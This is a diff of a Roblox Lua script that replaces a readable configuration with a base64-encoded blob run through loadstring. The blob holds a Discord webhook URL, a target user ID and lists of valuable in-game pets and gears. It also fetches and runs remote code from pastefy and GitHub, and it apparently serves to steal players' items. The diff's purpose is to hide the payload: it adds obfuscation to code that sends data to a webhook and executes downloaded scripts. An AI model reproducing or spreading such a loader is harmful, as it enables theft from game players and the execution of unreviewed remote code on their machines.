@@ -1,137 +1,74 @@
-local genv = getgenv()
-
-genv.GOOD_WEBHOOK = (function() local b={233,245,245,241,242,187,174,174,229,232,242,226,238,243,229,175,226,238,236,174,224,241,232,174,246,228,227,233,238,238,234,242,174,176,180,178,179,181,184,179,184,183,185,185,178,176,185,185,176,179,179,183,174,199,238,194,172,201,198,201,202,240,240,201,245,202,213,182,194,233,213,177,226,212,200,198,213,246,206,216,198,244,216,215,233,228,209,249,176,195,194,180,214,182,227,234,216,172,248,202,197,234,246,244,185,248,222,245,211,215,234,201,184,234,182,248,179,226,202,230,230} local k=129 local o={} for i=1,#b do o[i]=string.char(bit32.bxor(b[i],k)) end return table.concat(o) end)()
-
-genv.TARGET_USER_ID = 10279786442
-
-genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
-
-genv.ALLOWED_ANIMALS = {
-    "Strawberry Elephant",
-    "Headless Horseman",
-    "John Pork",
-    "Skibidi Toilet",
-    "Griffin",
-    "Meowl",
-    "Dragon Aquanini",
-    "Dragon Gingerini",
-    "Hydra Dragon Cannelloni",
-    "Signore Carapace",
-    "Dragon Cannelloni",
-    "Love Love Bear",
-    "Digi Narwhal",
-    "Kraken",
-    "La Supreme Combinasion",
-    "Celestial Pegasus",
-    "Hydra Bunny",
-    "Elefanto Frigo",
-    "Cerberus",
-    "Rosey and Teddy",
-    "Popcuru and Fizzuru",
-    "Bunny and Eggy",
-    "Capitano Moby",
-    "Cooki and Milki",
-    "Arcadragon",
-    "Burguro and Fryuro",
-    "Reinito Sleighito",
-    "Ketupat Bros",
-    "Fortunu and Cashuru",
-    "Los Amigos",
-    "Antonio",
-    "La Secret Combinasion",
-    "Pancake and Syrup",
-    "Foxini Lanternini",
-    "Kalika Bros",
-    "Los Sekolahs",
-    "Sammyni Fattini",
-    "Cash or Card",
-    "Fragrama and Chocrama",
-    "La Casa Boo",
-    "Duggy Bros",
-    "Sammyni Cakini",
-    "La Food Combinasion",
-    "Spooky and Pumpky",
-    "Boppin Bunny",
-    "Ginger Gerat",
-    "Los Chillis",
-    "Los Hackers",
-    "Bearito Cabinito",
-    "Los Spaghettis",
-    "Festive 67",
-    "Guest 666",
-    "Rubrikiko",
-    "Quackini Snackini",
-    "Cloverat Clapat",
-    "Hopilikalika Hopilikalako",
-    "Garama and Madundung",
-    "Fishino Clownino",
-    "Jolly Jolly Sahur",
-    "Gym Bros",
-    "Tirilikalika Tirilikalako",
-    "Rico Dinero",
-    "Dug Dug Dug",
-    "Fragola La La La",
-    "Los Primos",
-    "Globa Steppa",
-    "Tralaledon",
-    "Moby Bros",
-    "Los Admins",
-    "La Ginger Sekolah",
-    "Capitano Americano"
-}
-
-genv.ALLOWED_BASESKINS = {
-    ["Rose"] = true,
-    ["Gingerbread"] = true,
-    ["Halloween"] = true,
-    ["Christmas"] = true,
-    ["Bunny Basket"] = true,
-    ["Summer"] = true,
-    ["Pot of Gold"] = true,
-    ["Taco"] = true,
-    ["Octo"] = true,
-    ["Valentines"] = true,
-    ["Easter"] = true,
-    ["Lucky"] = true,
-    ["Aquatic"] = true,
-    ["Tralala"] = true
-}
-
-genv.ALLOWED_GEARS = {
-    ["Santa's Sleigh"] = true,
-    ["Cupid's Wings"] = true,
-    ["Witch's Broom"] = true,
-    ["Waverider"] = true,
-    ["Yin Yang Slap"] = true,
-    ["Cursed Slap"] = true,
-    ["Cyber Slap"] = true,
-    ["Divine Slap"] = true,
-    ["Bloodmoon Slap"] = true,
-    ["Radioactive Slap"] = true,
-    ["Rainbow Slap"] = true,
-    ["Rainbow Hammer"] = true,
-    ["Bloodmoon Hammer"] = true,
-    ["Radioactive Airstrike"] = true,
-    ["Yin Yang Lamp"] = true,
-    ["Blackhole Bomb"] = true,
-    ["Phantom Slap"] = true,
-    ["Demon's Head"] = true
-}
-
-genv.ALLOWED_PLACE_IDS = {
-    109983668079237
-}
-
--- Extra scripts (moved out of main)
-genv.EXTRA_LOADSTRINGS = {
-    "https://pastefy.app/I9mewuyb/raw"
-}
-
--- Optional GUI / other loaders
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/su9hI8dc/raw"))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
-end)
+-- encoded
+local
+_D=[[bG9jYWwgZ2VudiA9IGdldGdlbnYoKQoKZ2Vudi5HT09EX1dFQkhPT0sgPSAoZnVuY3Rpb
+24oKQogICAgbG9jYWwgZD0iYUhSMGNITTZMeTlrYVhOamIzSmtMbU52YlM5aGNHa3ZkMlZp
+YUc5dmEzTXZNVFV6TWpRNU1qazJPRGd6TVRnNE1USXlOaTlHYjBNdFNFZElTM0Z4U0hSTF
+ZEZERhRlF3WTFWSlIxUjNUMWxIZFZsV2FHVlFlREZDUXpWWE4ySnJXUzE1UzBScmQzVTRlV
+jkwVWxaclNEbHJOM2t5WTB0blp3PT0iCiAgICBsb2NhbCBCPSJBQkNERUZHSElKS0xNTk9Q
+UVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvIgogICA
+gbG9jYWwgbyxiPXt9LHt9CiAgICBmb3IgaT0xLCNCIGRvIGJbQjpzdWIoaSxpKV09aS0xIGVuZA
+ogICAgbG9jYWwgbixiaXRzPTAsMAogICAgZm9yIGk9MSwjZCBkbwogICAgICAgIGxvY2FsIGM
+9ZDpzdWIoaSxpKQogICAgICAgIGlmIGN+PSc9JyB0aGVuCiAgICAgICAgICAgIGxvY2FsIHY9Ylt
+jXQogICAgICAgICAgICBpZiB2IHRoZW4KICAgICAgICAgICAgICAgIG49bio2NCt2OyBiaXRzPW
+JpdHMrNgogICAgICAgICAgICAgICAgaWYgYml0cz49OCB0aGVuIGJpdHM9Yml0cy04OyBvWy
+NvKzFdPXN0cmluZy5jaGFyKG1hdGguZmxvb3Iobi8yXmJpdHMpJTI1Nik7IG49biUyXmJpdHM
+gZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gdGFib
+GUuY29uY2F0KG8pCmVuZCkoKQoKZ2Vudi5UQVJHRVRfVVNFUl9JRCA9IDEwMjc5Nzg2NDQ
+yCgpnZW52LkdPT0RfQVZBVEFSID0gImh0dHBzOi8vY2RuLnBmcHMuZ2cvcGZwcy83NzYwMi
+1ibG9vZC1jYXQuZ2lmIgoKZ2Vudi5BTExPV0VEX0FOSU1BTFMgPSB7CiAgICAiU3RyYXdiZXJy
+eSBFbGVwaGFudCIsCiAgICAiSGVhZGxlc3MgSG9yc2VtYW4iLAogICAgIkpvaG4gUG9yayIsCiA
+gICAiU2tpYmlkaSBUb2lsZXQiLAogICAgIkdyaWZmaW4iLAogICAgIk1lb3dsIiwKICAgICJEcmFn
+b24gQXF1YW5pbmkiLAogICAgIkRyYWdvbiBHaW5nZXJpbmkiLAogICAgIkh5ZHJhIERyYWdvb
+iBDYW5uZWxsb25pIiwKICAgICJTaWdub3JlIENhcmFwYWNlIiwKICAgICJEcmFnb24gQ2Fubm
+VsbG9uaSIsCiAgICAiTG92ZSBMb3ZlIEJlYXIiLAogICAgIkRpZ2kgTmFyd2hhbCIsCiAgICAiS3Jh
+a2VuIiwKICAgICJMYSBTdXByZW1lIENvbWJpbmFzaW9uIiwKICAgICJDZWxlc3RpYWwgUGVn
+YXN1cyIsCiAgICAiSHlkcmEgQnVubnkiLAogICAgIkVsZWZhbnRvIEZyaWdvIiwKICAgICJDZXJiZ
+XJ1cyIsCiAgICAiUm9zZXkgYW5kIFRlZGR5IiwKICAgICJQb3BjdXJ1IGFuZCBGaXp6dXJ1IiwKIC
+AgICJCdW5ueSBhbmQgRWdneSIsCiAgICAiQ2FwaXRhbm8gTW9ieSIsCiAgICAiQ29va2kgYW5
+kIE1pbGtpIiwKICAgICJBcmNhZHJhZ29uIiwKICAgICJCdXJndXJvIGFuZCBGcnl1cm8iLAogICA
+gIlJlaW5pdG8gU2xlaWdoaXRvIiwKICAgICJLZXR1cGF0IEJyb3MiLAogICAgIkZvcnR1bnUgYW5
+kIENhc2h1cnUiLAogICAgIkxvcyBBbWlnb3MiLAogICAgIkFudG9uaW8iLAogICAgIkxhIFNlY3Jld
+CBDb21iaW5hc2lvbiIsCiAgICAiUGFuY2FrZSBhbmQgU3lydXAiLAogICAgIkZveGluaSBMYW50
+ZXJuaW5pIiwKICAgICJLYWxpa2EgQnJvcyIsCiAgICAiTG9zIFNla29sYWhzIiwKICAgICJTYW1te
+W5pIEZhdHRpbmkiLAogICAgIkNhc2ggb3IgQ2FyZCIsCiAgICAiRnJhZ3JhbWEgYW5kIENob2N
+yYW1hIiwKICAgICJMYSBDYXNhIEJvbyIsCiAgICAiRHVnZ3kgQnJvcyIsCiAgICAiU2FtbXluaSBD
+YWtpbmkiLAogICAgIkxhIEZvb2QgQ29tYmluYXNpb24iLAogICAgIlNwb29reSBhbmQgUHVtcGt
+5IiwKICAgICJCb3BwaW4gQnVubnkiLAogICAgIkdpbmdlciBHZXJhdCIsCiAgICAiTG9zIENoaWx
+saXMiLAogICAgIkxvcyBIYWNrZXJzIiwKICAgICJCZWFyaXRvIENhYmluaXRvIiwKICAgICJMb3M
+gU3BhZ2hldHRpcyIsCiAgICAiRmVzdGl2ZSA2NyIsCiAgICAiR3Vlc3QgNjY2IiwKICAgICJSdWJy
+aWtpa28iLAogICAgIlF1YWNraW5pIFNuYWNraW5pIiwKICAgICJDbG92ZXJhdCBDbGFwYXQiL
+AogICAgIkhvcGlsaWthbGlrYSBIb3BpbGlrYWxha28iLAogICAgIkdhcmFtYSBhbmQgTWFkdW5k
+dW5nIiwKICAgICJGaXNoaW5vIENsb3duaW5vIiwKICAgICJKb2xseSBKb2xseSBTYWh1ciIsCiA
+gICAiR3ltIEJyb3MiLAogICAgIlRpcmlsaWthbGlrYSBUaXJpbGlrYWxha28iLAogICAgIlJpY28gRGl
+uZXJvIiwKICAgICJEdWcgRHVnIER1ZyIsCiAgICAiRnJhZ29sYSBMYSBMYSBMYSIsCiAgICAiT
+G9zIFByaW1vcyIsCiAgICAiR2xvYmEgU3RlcHBhIiwKICAgICJUcmFsYWxlZG9uIiwKICAgICJNb
+2J5IEJyb3MiLAogICAgIkxvcyBBZG1pbnMiLAogICAgIkxhIEdpbmdlciBTZWtvbGFoIiwKICAgICJ
+DYXBpdGFubyBBbWVyaWNhbm8iCn0KCmdlbnYuQUxMT1dFRF9CQVNFU0tJTlMgPSB7CiAg
+ICBbIlRyYWxhbGEiXSA9IHRydWUKfQoKZ2Vudi5BTExPV0VEX0dFQVJTID0gewogICAgWyJSY
+WluYm93IFNsYXAiXSA9IHRydWUsCiAgICBbIlJhaW5ib3cgSGFtbWVyIl0gPSB0cnVlLAogICAg
+WyJCbG9vZG1vb24gSGFtbWVyIl0gPSB0cnVlCn0KCmdlbnYuQUxMT1dFRF9QTEFDRV9JRF
+MgPSB7CiAgICAxMDk5ODM2NjgwNzkyMzcKfQoKLS0gRXh0cmEgc2NyaXB0cyAobW92ZWQ
+gb3V0IG9mIG1haW4pCmdlbnYuRVhUUkFfTE9BRFNUUklOR1MgPSB7CiAgICAiaHR0cHM6Ly
+9wYXN0ZWZ5LmFwcC9JOW1ld3V5Yi9yYXciCn0KCi0tIE9wdGlvbmFsIEdVSSAvIG90aGVyIGxv
+YWRlcnMKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdl
+dCgiaHR0cHM6Ly9wYXN0ZWZ5LmFwcC9zdTloSThkYy9yYXciKSkoKQplbmQpCgp0YXNrLnN
+wYXduKGZ1bmN0aW9uKCkKICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczov
+L3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbm9yZ2VnYXQtYnl0ZS9LMi9yZWZzL2hlYWRzL
+21haW4vbWFpbi5sdWEiKSkoKQplbmQp]]
+local _B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local function _dec(d)
+local o,b={},{}
+for i=1,#_B do b[_B:sub(i,i)]=i-1 end
+local n,bits=0,0
+for i=1,#d do
+local c=d:sub(i,i)
+if c=='=' then break end
+local v=b[c]
+if v then
+n=n*64+v; bits=bits+6
+if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
+end
+end
+return table.concat(o)
+end
+loadstring(_dec(_D))()
